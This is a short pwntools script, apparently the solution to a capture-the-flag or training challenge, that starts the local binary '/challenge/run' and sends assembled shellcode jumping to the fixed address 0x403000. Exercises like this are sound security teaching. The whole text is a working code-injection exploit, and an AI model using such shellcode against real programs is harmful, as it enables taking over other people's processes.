from pwn import *
context.arch = "amd64"
p = process("/challenge/run")
p.recvline()
p.send(asm('''
mov rax, 0x403000
jmp rax
'''))
print(p.recvallS())
